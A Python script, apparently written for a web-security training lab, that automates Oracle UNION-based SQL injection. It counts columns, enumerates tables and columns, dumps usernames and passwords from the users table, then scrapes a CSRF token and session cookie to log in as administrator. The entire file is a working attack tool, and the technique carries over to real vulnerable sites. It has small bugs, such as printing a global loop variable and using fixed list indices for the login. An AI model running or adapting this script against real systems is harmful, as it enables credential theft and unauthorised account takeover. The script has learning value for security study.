```python
import requests
import sys
from bs4 import BeautifulSoup


def supportString(index, cols, URL):
    nulls = (cols * "null,").split(',')
    print(f"[-] Determining if column {index + 1} supports string...")
    nulls[index] = "'dummy'"
    payload = ",".join(nulls)[:-1]

    response = requests.get(URL + "'+UNION+SELECT+"+ payload +"+FROM+Dual+--+-+")
    if response.status_code == 200:
        print(f"[+] Column {i + 1} supports string...")
        return index
    else:
        print(f"[-] Column {i + 1} does not support string...")
        return None

def findCols(URL):
    i = 1
    cols = 0
    while True:
        response = requests.get(URL + "'+ORDER+BY+" + str(i) + "+--+-+")
        if response.status_code != 200:
            cols = i - 1
            print(f"[+] No. of columns : {(i -1)}")
            break
        i += 1
    return cols

if len(sys.argv) != 2:
    print(f"[+] USAGE : {sys.argv[0]} <URL of the lab>")
    sys.exit(1)

URL = sys.argv[1]

print("[-] Determining number of columns...")
cols = findCols(URL)

string_indices = []
for i in range(cols):
    string_indices.append(supportString(i, cols, URL))
print(f"[+] {len(string_indices)} column(s) support string in total...")

blacklist = ["Babbage Web Spray","Giant Grasshopper","More Than Just Birdsong","Pest Control Umbrella"]

print("[-] Trying to find DB tables...")
response = requests.get(URL + "'+UNION+SELECT+table_name,null+FROM+all_tables+--+-+")
soup = BeautifulSoup(response.content, "html5lib")
results = soup.find_all("th")
tables = []
for result in results:
    tmp = result.get_text()
    if tmp not in blacklist:
        tables.append(tmp)
print(f"[+] Found {len(tables)} tables...")

print("[-] Enumerating columns in the tables...")
for table in tables:
    response = requests.get(URL + "'+UNION+SELECT+column_name,null+FROM+all_tab_columns+WHERE+table_name+=+'"+ table + "'+--+-+")
    soup = BeautifulSoup(response.content, "html5lib")
    results = soup.find_all("th")
    for column in results:
        tmp = column.get_text()
        if tmp not in blacklist:
            if "USER" in tmp or "PASS" in tmp :
                print(f"[+] Possible table : {table}...")
                print("\t" + column.get_text())

print("[-] Dumping usernames...")
users = []
response = requests.get(URL + "'+UNION+SELECT+USERNAME_LNUMZD,null+FROM+USERS_CWFZLM+--+-+")
soup = BeautifulSoup(response.content, "html5lib")
results = soup.find_all("th")
for result in results:
    tmp = result.get_text()
    if tmp not in blacklist:
        print("\t" + tmp)
        users.append(tmp)

print("[-] Dumping passwords...")
pwds = []
response = requests.get(URL + "'+UNION+SELECT+PASSWORD_HTJREB,null+FROM+USERS_CWFZLM+--+-+")
soup = BeautifulSoup(response.content, "html5lib")
results = soup.find_all("th")
for result in results:
    tmp = result.get_text()
    if tmp not in blacklist:
        print("\t" + tmp)
        pwds.append(tmp)

print("[-] Getting CSRF token and Session cookie...")
response = requests.get(URL.replace("/filter?category=Pets", "") + "/login")
soup = BeautifulSoup(response.content, "html5lib")
csrf = str(soup.find_all("input")[0]).split(" ")[4].replace('value="', "").replace('"/>', "")
print(f"[+] CSRF token : {csrf}")
sess_cookie = response.cookies["session"]
print(f"[+] Session cookie : {sess_cookie}")

print("[-] Trying to log in as administrator...")
response = requests.post(URL.replace("/filter?category=Pets", "") + "/login", data={"csrf":csrf, "username":users[0], "password":pwds[2]}, headers={"Cookie":"session=" + sess_cookie})
if response.status_code == 200:
    print("[+] Mission Accomplished. Respect++")
else:
    print("[-] TRY HARDER!!")
```